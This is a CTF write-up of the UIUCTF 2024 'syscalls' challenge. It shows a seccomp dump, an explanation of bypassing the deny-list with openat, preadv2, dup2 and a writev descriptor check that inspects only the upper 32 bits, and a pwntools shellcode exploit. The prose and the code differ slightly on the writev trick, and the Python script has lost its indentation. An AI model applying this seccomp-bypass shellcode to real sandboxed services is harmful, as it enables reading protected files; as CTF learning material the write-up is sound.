---
title: "UIUCTF 2024 syscalls: reading a flag around a seccomp deny-list"
description: The filter blocks read, write, open, and execve, but openat, preadv2, and a writev argument check that inspects the wrong half of the descriptor are enough to print flag.txt.
pubDate: 2024-07-11
draft: false
---
Source: [github.com/Lu1sDV/ctf_writeups — UIUCTF.2K24/syscalls](https://github.com/Lu1sDV/ctf_writeups/tree/master/UIUCTF.2K24/syscalls)

Category: **PWN**
Points: **389**
Solves: **143**


```sh
Author: Nikhil

You can't escape this fortress of security.

ncat --ssl syscalls.chal.uiuc.tf 1337
```

## Attachments
- Syscalls
- Dockerfile
## Index
- [Syscalls](#syscalls)
  - [Attachments](#attachments)
  - [Index](#index)
  - [TL;DR](#tldr)
  - [Solve](#solve)
  - [Considerations](#considerations)
  - [Exploit](#exploit)

## TL;DR

I can execute a shellcode, but seccomp is enabled. Almost all dangerous syscalls for code execution/file read are disabled, except `Openat`, `preadv2`, `writev` (with some constraints).
Flag file path is given by our binary banner, and by Dockerfile, moreover.

Hence:
 - I open flag.txt with `Openat`, setting *dirfd* to -100, which forces our syscall to open our file from current directory.
 - I read our file in a *iovec array* with `preadv2`
 - Syscall `writev` is constrained, we can only write to file descriptors bigger than  *0x3e8*, making writing directly to *stdout* impossible.
 - Thus I duplicate our *stdout* to a big enough File Descriptor with `dup2` syscall and I print our *iovec* array to *stdout* using our duplicated File Descriptor.

## Solve

Let's explain it with a bit more details.

First thing I dump the seccomp rules.
```sh
> seccomp-tools dump ./syscalls
The flag is in a file named flag.txt located in the same directory as this binary. That's all the information I can give you.
d
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x16 0xc000003e  if (A != ARCH_X86_64) goto 0024
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
 0004: 0x15 0x00 0x13 0xffffffff  if (A != 0xffffffff) goto 0024
 0005: 0x15 0x12 0x00 0x00000000  if (A == read) goto 0024
 0006: 0x15 0x11 0x00 0x00000001  if (A == write) goto 0024
 0007: 0x15 0x10 0x00 0x00000002  if (A == open) goto 0024
 0008: 0x15 0x0f 0x00 0x00000011  if (A == pread64) goto 0024
 0009: 0x15 0x0e 0x00 0x00000013  if (A == readv) goto 0024
 0010: 0x15 0x0d 0x00 0x00000028  if (A == sendfile) goto 0024
 0011: 0x15 0x0c 0x00 0x00000039  if (A == fork) goto 0024
 0012: 0x15 0x0b 0x00 0x0000003b  if (A == execve) goto 0024
 0013: 0x15 0x0a 0x00 0x00000113  if (A == splice) goto 0024
 0014: 0x15 0x09 0x00 0x00000127  if (A == preadv) goto 0024
 0015: 0x15 0x08 0x00 0x00000128  if (A == pwritev) goto 0024
 0016: 0x15 0x07 0x00 0x00000142  if (A == execveat) goto 0024
 0017: 0x15 0x00 0x05 0x00000014  if (A != writev) goto 0023
 0018: 0x20 0x00 0x00 0x00000014  A = fd >> 32 # writev(fd, vec, vlen)
 0019: 0x25 0x03 0x00 0x00000000  if (A > 0x0) goto 0023
 0020: 0x15 0x00 0x03 0x00000000  if (A != 0x0) goto 0024
 0021: 0x20 0x00 0x00 0x00000010  A = fd # writev(fd, vec, vlen)
 0022: 0x25 0x00 0x01 0x000003e8  if (A <= 0x3e8) goto 0024
 0023: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0024: 0x06 0x00 0x00 0x00000000  return KILL

```
I notice the following things:
- I can't execute system commands: `execve` and `execveat` syscalls are disabled. 
- I can open a file with `openat` syscall.
- I can read a file into a *iovec array* using `preadv2`
- `writev` syscall is allowed, but I can't write into File Descriptors equal to or lower than 0x3e8:
```sh
 0021: 0x20 0x00 0x00 0x00000010  A = fd # writev(fd, vec, vlen)
 0022: 0x25 0x00 0x01 0x000003e8  if (A <= 0x3e8) goto 0024
 0023: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0024: 0x06 0x00 0x00 0x00000000  return KILL
```
After that I check our binary protections, but we don't really need it since we can already execute a shellcode of our choice, but it's always a good practice so I do it anyway.
```
gef➤  checksec
[+] checksec for '/home/x/CTF/UIUCTF2K24/syscalls/syscalls'
Canary                        : ✓ (value: 0x56e72e494939ac00)
NX                            : ✘ 
PIE                           : ✓ 
Fortify                       : ✘ 
RelRO                         : Full
```

Then I execute our binary for a first insight.

```sh
 > ./syscalls                   
The flag is in a file named flag.txt located in the same directory as this binary. That's all the information I can give you.

```

Banner is pointing us out that our flag is stored into *flag.txt*. Then it reads an arbitrary shellcode and executes it.

Well let's start developing a strategy.

Opening *flag.txt* file is pretty trivial, `openat` syscall is not blacklisted. Never underestimate the power of `openat` and `execveat` syscalls.
Reading `openat` *man*'s description we learn that:

>If the pathname given in _pathname_ is relative, then it is interpreted relative to the directory referred to by the file descriptor _dirfd_ (rather than relative to the current working directory of the calling process, as is done by **[open](https://linux.die.net/man/2/open)**(2) for a relative pathname).
>If _pathname_ is relative and _dirfd_ is the special value **AT_FDCWD**, then _pathname_ is interpreted relative to the current working directory of the calling process (like **[open](https://linux.die.net/man/2/open)**(2)).
>If _pathname_ is absolute, then _dirfd_ is ignored.

So I have two options, using an absolute pathname or setting *_dirfd_* to *AT_FDCWD*.
I'll use the latter for simplicity.

Once having our file opened, we must read our file into somewhere. Being impossible for us common mortals remembering all syscalls, I start skimming **[syscall.sh](https://x64.syscall.sh/)**.
So I find an interesting syscall which is not in *seccomp* blacklist: `preadv2`.

> **ssize_t readv(int** _fd_**, const struct iovec * **_iov_**, int** _iovcnt_**);**
> The **readv**() system call reads _iovcnt_ buffers from the file associated with the file descriptor _fd_ into the buffers described by _iov_ ("scatter input").
> The **writev**() system call writes _iovcnt_ buffers of data described by _iov_ to the file associated with the file descriptor _fd_ ("gather output").
> The pointer _iov_ points to an array of _iovec_ structures, defined in _<[sys/uio.h](https://linux.die.net/include/sys/uio.h)>_ as:
> struct iovec {
> void  *iov_base;    /* Starting address */
> size_t iov_len;     /* Number of bytes to transfer */
> }; 

Thus I create a *iovec struct* on stack and I read *flag.txt* into it.

Well now that I have *flag.txt* content in memory, it's time to print it out.

As our binary seccomp rules suggests I can use `writev`. But unluckily it's not so easy. Our destination File Descriptor must be greater than *0x3e8*, otherwise our program is brutally killed.

How can we do it? Thanks to `dup2` syscall! 
>#include <[unistd.h](https://linux.die.net/include/unistd.h)>
>int dup(int oldfd); int dup2(int oldfd, int newfd);
>**dup2**() makes _newfd_ be the copy of _oldfd_, closing _newfd_ first if necessary, but note the following:
>If _oldfd_ is not a valid file descriptor, then the call fails, and _newfd_ is not closed.
>If _oldfd_ is a valid file descriptor, and _newfd_ has the same value as _oldfd_, then **dup2**() does nothing, and returns _newfd_.
>After a successful return from one of these system calls, the old and new file descriptors may be used interchangeably. They refer to the same open file description (see _**[open](https://linux.die.net/man/2/open)**(2)_) and thus share file offset and file status flags; for example, if the file offset is modified by using _**[lseek](https://linux.die.net/man/2/lseek)**(2)_ on one of the descriptors, the offset is also changed for the other.
>The two descriptors do not share file descriptor flags (the close-on-exec flag). The close-on-exec flag (**FD_CLOEXEC**; see _**[fcntl](https://linux.die.net/man/2/fcntl)**(2)_) for the duplicate descriptor is off.

So I duplicate *stdout* into a big enough File descriptor and we can finally print our flag out.


## Considerations
This challenge made me learn about `writev` and `pread` syscalls. I think that it was an overall nice challenge.

## Exploit
```python
#!/usr/bin/env python3
  
from  pwn  import  *

exe  =  ELF("./syscalls_patched")
context.binary  =  exe
context.terminal  = ["tmux", "splitw", "-h"]

def  conn():

if  args.LOCAL:
r  =  process([exe.path])
if  args.GDB:
gdb.attach(r)

else:
r  =  remote("syscalls.chal.uiuc.tf", 1337, ssl=True)  
return  r

def  main():

r  =  conn()
r.recvuntil(b"I can give you.\n")
shellcode  =  """
mov rdi, -100
lea rsi, [rip + x1]
mov rdx, 0
mov eax, 257
syscall

lea r12, [rsp+24]
push 60
push r12

mov rdi, 3
lea rsi, [rsp]
mov rdx, 1
mov r10, 0
xor r8, r8
mov eax, 327
syscall

mov rdi, 1
mov rsi, 4294967296
mov rax, 33
syscall

mov rdi, 4294967296
lea rsi, [rsp]
mov rdx, 1
mov r9, 0
mov eax, 20

syscall
x1:
.ascii "flag.txt"
.byte 0
"""
r.sendline(asm(shellcode))
r.interactive()
if  __name__  ==  "__main__":

main()
```